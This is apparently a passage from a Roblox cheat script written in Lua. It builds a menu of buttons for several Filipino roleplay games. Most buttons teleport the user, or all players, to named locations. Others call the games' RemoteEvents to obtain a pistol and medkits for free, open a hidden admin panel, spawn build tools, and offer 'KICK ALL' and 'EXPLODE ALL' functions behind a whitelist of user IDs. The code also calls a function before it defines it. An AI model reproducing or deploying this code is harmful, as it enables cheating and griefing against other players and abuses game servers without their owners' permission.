-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE BDO [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-340.49237060546875, 41.12915802001953, 493.6236267089844)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("-----------------------------FANTASY RP-----------------------------", function()

end)

--// 8 Buttons in Main Menu
addMainMenuButton("HOSPITAL [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(990.8152465820312, 32.28494644165039, 296.9470520019531)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GARAGE [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(580.9376220703125, 21.959636688232422, 265.1108093261719)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CLOTHING [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-737.8309326171875, 4.620716094970703, 292.19171142578125)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GUNSHOP [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-694.0562133789062, 7.702183723449707, 26.884098052978516)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("STORAGE 1 [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-298.9566955566406, 48.019386291503906, -125.68920135498047)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("STORAGE 2 [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(2962.96826171875, 42.9012451171875, 1055.046875)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("FLEECA [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-283.9338684082031, 4.600690841674805, 323.8304443359375)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CAR DEALER [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-713.2727661132812, 5.238117218017578, -264.2020263671875)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("RED GARAGE [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(1515.0609130859375, 4.029794692993164, -1342.2032470703125)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("JOB BOX START [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-353.32061767578125, 3.998025417327881, -91.46287536621094)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("JOB BOX LOCATE [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-351.8985900878906, 4.048017501831055, -27.99223518371582)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("POLICE DEPARTMENT [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-808.3770141601562, 67.06934356689453, 2825.408935546875)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("LIMEYS [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-121.21233367919922, 20.518102645874023, 637.3209838867188)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("KOPPE BEAN [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-331.3203125, 20.13085174560547, 252.96755981445312)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("-------------------------------CAVITE RP---------------------------", function()
    game:GetService("ReplicatedStorage").GiveAyuda:FireServer("Normal Pistol", -1)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("HOSPITAL [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-1006.0828857421875, 43.35292434692383, -186.58172607421875)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CLOTHING [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-791.9968872070312, 4.168969631195068, -464.7488098144531)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("STORAGE [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-1146.287109375, 3.9980430603027344, 69.46240997314453)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GUNSHOP [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-723.1824951171875, 4.329793930053711, -1040.801025390625)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("JOX BOX [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-389.4685363769531, 4.183757781982422, -52.90208435058594)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("ATM [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-701.1449584960938, 4.229806423187256, -1026.8604736328125)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)   

--// 8 Buttons in Main Menu
addMainMenuButton("BLACK MARKET [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(310.0500183105469, 4.998108863830566, 1124.1072998046875)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE HIGH GROUND [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(632.6267700195312, 40.997650146484375, -439.8812561035156)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("POLICE DEPARTMENT [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-596.0802001953125, 13.955011367797852, 703.0349731445312)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("-----------------------------BAGONG BARYO-----------------------------", function()
    game:GetService("ReplicatedStorage").GiveOxyBox:FireServer("MEDKIT", -1)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("HOSPITAL [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1393.31591796875, 6.512001991271973, -573.355712890625)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CLOTHING [BAGONG BARYO]", function()
    local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local targetPosition = Vector3.new(572.8681640625, 4.861981391906738, 211.42648315429688)

local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
    else
        print("Error: HumanoidRootPart missing.")
    end
end

teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GARAGE [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1163.9576416015625, 6.478593826293945, -548.2848510742188)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("ATM [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1206.787109375, 7.270822525024414, -398.3341369628906)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("JOB BOX [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(876.21923828125, 5.492217063903809, 602.9971313476562)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("FISH FARM [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(243.63778686523438, 4.699999809265137, -978.7501831054688)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("UWU [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(863.9736938476562, 5.49222469329834, 184.72341918945312)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1674.3304443359375, 54.93671417236328, 909.4314575195312)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("POLICE DEPARTMENT [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(874.050048828125, 9.073480606079102, -62.26642608642578)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("MECH SHOP [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1284.14794921875, 5.208094596862793, 814.0725708007812)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("-----------------------------PROMINENCE RP-----------------------------", function()
    game:GetService("ReplicatedStorage").GivePistolBox:FireServer("MEDKIT", -1)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("HOSPITAL [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-316.231689453125, 4.224208354949951, -278.7334289550781)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GARAGE [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-318.2171325683594, 4.224208831787109, -14.7344388961792)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("STORAGE [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-255.43678283691406, 3.90071439743042, 87.1461410522461)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GUNSHOP [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-557.5521240234375, 8.19964599609375, 255.06863403320312)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("FISH FARM [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-765.808594, 11.4731388, -735.463379, 0.993488431, -6.31751078e-08, -0.113933206, 7.00669958e-08, 1, 5.64860798e-08, 0.113933206, -6.41012221e-08, 0.993488431)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TAMBAYAN [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-837.4158935546875, 71.86466979980469, -756.404541015625)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("UWU [PROMINENCE]", function()
   -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(5.1688408851623535, 4.1596574783325195, 223.21153259277344)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget() 
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CRAFT SYSTEM [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-813.8836059570312, -30.67633056640625, -668.554443359375)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(639.3765869140625, 4.062220573425293, 417.1491394042969)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("POLICE DEPARTMENT [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-685.2726440429688, 7.258538246154785, -163.53884887695312)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("7 ELEVEN [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-71.01229858398438, 3.90071439743042, 561.624267578125)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CLOTHING [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-287.8799133300781, 19.498348236083984, 465.8647155761719)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["ADMIN PANEL"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.Roboto,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})

	btn.MouseEnter:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local hover = t.bg:Lerp(accent, 0.50)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = hover}):Play()
	end)
	btn.MouseLeave:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local base = t.bg:Lerp(accent, 0.32)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = base}):Play()
	end)

	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 8 Buttons in Main Menu
addMainMenuButton("NOTE : ONLY WHITLISTED USER CAN USE THIS !", function()
	
end)

--// 8 Buttons in Main Menu
addMainMenuButton("ADMIN PANEL KICK ALL / SPAWN BTOOLS / TROLL / ADMIN GUN / SET SKY", function()
	local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

local whitelist = {
    [8172987891] = true,
    [3317684405] = true, 
	[9842730123] = true,
    [3736307974] = true, 
    [9000796247] = true, 
    [2685394161] = true,  
    [6226066651] = true,
	[9925586155] = true,
	[6213315646] = true,  
    [8625608074] = true,
	[8708504286] = true,
	[2757397228] = true,
	[4602182711] = true,
	[5804682562] = true,
	[2577804945] = true,
	[7761002961] = true,
	[8970489737] = true,
	[8174283950] = true,
	[2860982002] = true,
	[8456876972] = true,
    [8797707488] = true,
    [956682331] = true,
    [423338358] = true,
	[9396953751] = true,
    [7116363414] = true,
    [7410409939] = true,
    [4885856980] = true,
	[4091230894] = true,
	[8619228276] = true,
	[8555340291] = true,
	[3575675921] = true,
	[7540853237] = true,
	[560604146] = true,
	[846984019] = true,
	[4602182711] = true,
    [player.UserId] = true -- OPTIONAL: auto allow self
}

--// CHECK PANEL
local panel = player:WaitForChild("PlayerGui"):WaitForChild("ExtraUI"):WaitForChild("AdminPanel")
panel.Transparency = 0.1
panel.Visible = false -- default hidden

--// ONLY ALLOWED CAN USE
if not whitelist[player.UserId] then
    warn("ACCESS DENIED: You are not whitelisted.")
    return
end

--// KEYBIND (V)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.V then
        panel.Visible = not panel.Visible
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("SPAWN BTOOLS (WHITLISTED ONLY)", function()
local Players = game:GetService("Players")
local player = Players.LocalPlayer

local whitelist = {
    [8172987891] = true,
    [3317684405] = true, 
	[9842730123] = true,
    [3736307974] = true, 
    [9000796247] = true, 
    [2685394161] = true,  
    [6226066651] = true,
	[9925586155] = true,
	[6213315646] = true,  
    [8625608074] = true,
	[8708504286] = true,
	[2757397228] = true,
	[4602182711] = true,
	[5804682562] = true,
	[2577804945] = true,
	[7761002961] = true,
	[8970489737] = true,
	[8174283950] = true,
	[2860982002] = true,
	[8456876972] = true,
    [8797707488] = true,
    [956682331] = true,
    [423338358] = true,
	[9396953751] = true,
    [7116363414] = true,
    [7410409939] = true,
    [4885856980] = true,
	[4091230894] = true,
	[8619228276] = true,
	[8555340291] = true,
	[3575675921] = true,
	[7540853237] = true,
	[560604146] = true,
	[846984019] = true,
    [player.UserId] = true -- OPTIONAL: auto allow self
}

if not whitelist[player.UserId] then
	player:Kick("Whitelist only.")
	return
end

local args = {
	[1] = player.Name
}

player:WaitForChild("PlayerGui", 9e9)
	:WaitForChild("ExtraUI", 9e9)
	:WaitForChild("AdminPanel", 9e9)
	:WaitForChild("WeaponsFrame", 9e9)
	:GetChildren()[7]
	:WaitForChild("Event", 9e9)
	:FireServer(unpack(args))
end)

--// 8 Buttons in Main Menu
addMainMenuButton("EXPLODE ALL (WHITELISTED ONLY)", function()
    local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

local whitelist = {
    [8172987891] = true,
    [3317684405] = true, 
	[9842730123] = true,
    [3736307974] = true, 
    [9000796247] = true, 
    [2685394161] = true,  
    [6226066651] = true,
	[9925586155] = true,
	[6213315646] = true,  
    [8625608074] = true,
	[8708504286] = true,
	[2757397228] = true,
	[4602182711] = true,
	[5804682562] = true,
	[2577804945] = true,
	[7761002961] = true,
	[8970489737] = true,
	[8174283950] = true,
	[2860982002] = true,
	[8456876972] = true,
    [8797707488] = true,
    [956682331] = true,
    [423338358] = true,
